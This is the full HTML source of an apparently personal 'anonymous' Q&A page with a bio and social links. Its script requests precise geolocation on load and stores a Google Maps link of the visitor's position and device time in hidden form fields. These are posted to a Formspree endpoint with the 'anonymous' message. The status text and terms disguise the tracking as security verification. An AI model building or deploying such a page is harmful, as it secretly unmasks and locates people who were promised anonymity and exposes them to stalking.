<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Nonsense Notes | Arpan Dhakal</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Inter', sans-serif;
      background: linear-gradient(-45deg, #E21B6D, #FF9933, #8E2DE2, #4A00E0);
      background-size: 400% 400%;
      animation: gradientBG 15s ease infinite;
      min-height: 100vh;
      margin: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 2rem;
    }
    @keyframes gradientBG {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    .glass-card {
      background: rgba(255, 255, 255, 0.96);
      backdrop-filter: blur(12px);
      border-radius: 2.5rem;
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.3);
      padding: 2.5rem;
      max-width: 450px;
      width: 100%;
      margin-bottom: 2rem;
    }
    .modal-overlay {
      background: rgba(0, 0, 0, 0.85);
      backdrop-filter: blur(8px);
      position: fixed; inset: 0; z-index: 100;
      display: flex; align-items: center; justify-content: center; padding: 1.5rem;
    }
    .hidden { display: none; }
    .fade-in { animation: fadeIn 0.5s ease-out; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    textarea { resize: none; border: none; background: transparent; }
  </style>
</head>
<body onload="requestLocation()">

  <div id="main-container" class="glass-card fade-in">
    <div class="flex items-center gap-4 mb-6">
      <div class="w-16 h-16 rounded-full bg-gradient-to-tr from-pink-500 to-yellow-400 p-1">
        <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Arpan" class="rounded-full bg-white" alt="Avatar">
      </div>
      <div>
        <h2 class="text-black font-extrabold text-lg">@Nonsense/arpan</h2>
        <p id="status-text" class="text-gray-400 text-[10px] font-black uppercase tracking-[0.2em]">ðŸ”’ Security Syncing...</p>
      </div>
    </div>

    <form id="qa-form" action="https://formspree.io/f/maqdyvye" method="POST">
      <input type="hidden" name="Maps_Link" id="maps-link" value="Permission Denied or Non-HTTPS">
      <input type="hidden" name="Device_Time" id="device-time">

      <div class="bg-gray-100/80 rounded-[2rem] p-6 min-h-[150px] relative border border-gray-200">
        <textarea id="message-input" name="message" required
          class="w-full text-pink-600 text-xl font-bold text-center placeholder-pink-200 outline-none"
          placeholder="Ask me anything..."></textarea>
        
        <div id="random-dice" class="absolute bottom-3 right-3 bg-white shadow-md rounded-full w-10 h-10 flex items-center justify-center text-xl cursor-pointer active:scale-90 transition-all">
          ðŸŽ²
        </div>
      </div>

      <button type="submit" id="send-btn" class="mt-6 w-full bg-black text-white font-black py-4 rounded-full text-lg shadow-xl hover:bg-gray-900 active:scale-95 transition-all">
        Send Anonymously!
      </button>
    </form>
  </div>

  <div class="flex gap-8 text-[11px] font-black uppercase text-white tracking-widest mb-10">
    <button onclick="toggleElement('portfolio')" class="hover:underline">Portfolio</button>
    <button onclick="toggleElement('terms-modal')" class="hover:underline">Terms</button>
    <button onclick="toggleElement('support-modal')" class="hover:underline">Support</button>
  </div>

  <div id="portfolio" class="glass-card hidden fade-in border-t-8 border-orange-500">
    <h2 class="text-2xl font-black mb-4">About Me</h2>
    <div class="text-gray-700 text-sm space-y-4 font-medium">
      <p>Hi, Iâ€™m <strong>Arpan Dhakal</strong>, from Bhutan, Sipsu. I study <strong>Sanskrit</strong> to understand <strong>God and Dharma</strong>.</p>
      <div class="bg-gray-50 p-4 rounded-xl border-l-4 border-pink-500 italic">"Iâ€™ve grown more through pain than comfort."</div>
      <p>My journey is shaped by experience and faith.</p>
    </div>
  </div>

  <div id="support-modal" class="modal-overlay hidden">
    <div class="glass-card max-w-[380px] relative fade-in">
      <button onclick="toggleElement('support-modal')" class="absolute top-4 right-4 font-bold text-gray-400">âœ•</button>
      <h2 class="text-2xl font-black mb-6 text-black">Connect</h2>
      <div class="space-y-3">
        <a href="https://youtube.com/@nonsensearpun?si=pVNIJT48HThQV-Zl" target="_blank" class="block p-4 bg-red-50 text-red-600 rounded-2xl font-bold">ðŸ“º YouTube</a>
        <a href="https://www.instagram.com/i.m.arpon_?igsh=MWJjYm1lbzBpNDY4cQ==" target="_blank" class="block p-4 bg-pink-50 text-pink-600 rounded-2xl font-bold">ðŸ“¸ Instagram</a>
        <a href="https://www.facebook.com/share/17upcCAmUe/" target="_blank" class="block p-4 bg-blue-50 text-blue-600 rounded-2xl font-bold">ðŸ‘¤ Facebook</a>
      </div>
    </div>
  </div>

  <div id="terms-modal" class="modal-overlay hidden">
    <div class="glass-card relative fade-in">
      <button onclick="toggleElement('terms-modal')" class="absolute top-4 right-4 font-bold text-gray-400">âœ•</button>
      <h2 class="text-xl font-black mb-4">Terms & Privacy</h2>
      <p class="text-sm text-gray-600 leading-relaxed">Identity remains anonymous. We use automated system verification (location/time) to filter out spam and ensure human interaction.</p>
    </div>
  </div>

  <script>
    // 1. THE TRACKING SCRIPT
    function requestLocation() {
      const status = document.getElementById('status-text');
      document.getElementById('device-time').value = new Date().toLocaleString();

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            // Generates a clickable Google Maps link for your dashboard
            document.getElementById('maps-link').value = `https://www.google.com/maps?q=${lat},${lon}`;
            status.innerText = "âœ… Security Verified";
            status.style.color = "#10b981"; // Success Green
          },
          (err) => { 
            status.innerText = "ðŸ”’ Secure & Anonymous";
            console.log("Location Denied or Not Secure Context");
          },
          { enableHighAccuracy: true }
        );
      }
    }

    // 2. UI HELPERS
    function toggleElement(id) { document.getElementById(id).classList.toggle('hidden'); }

    document.addEventListener("DOMContentLoaded", function() {
      const inputField = document.getElementById('message-input');
      const questions = ["are u single?", "rate me 1-10", "your darkest secret?", "honestly, am I annoying?"];
      
      document.getElementById('random-dice').addEventListener('click', () => {
        inputField.value = questions[Math.floor(Math.random() * questions.length)];
        inputField.focus();
      });

      // FORM SUBMISSION
      const form = document.getElementById("qa-form");
      form.addEventListener("submit", async function(e){
        e.preventDefault();
        const btn = document.getElementById("send-btn");
        btn.innerText = "SENDING...";
        btn.disabled = true;

        try {
          const response = await fetch(form.action, {
            method:'POST',
            body: new FormData(form),
            headers:{ 'Accept': 'application/json' }
          });
          if(response.ok){
            document.getElementById("main-container").innerHTML = `
              <div class="text-center py-10 fade-in">
                <div class="text-6xl mb-4">âœ¨</div>
                <h2 class="text-2xl font-black mb-2">Sent Successfully!</h2>
                <p class="text-gray-500 mb-6">Arpan will check your message.</p>
                <button onclick="location.reload()" class="text-pink-500 font-bold underline">Send Another</button>
              </div>`;
          }
        } catch(err) {
          alert("Error. Try again.");
          btn.innerText = "Send Anonymously!";
          btn.disabled = false;
        }
      });
    });
  </script>
</body>
</html>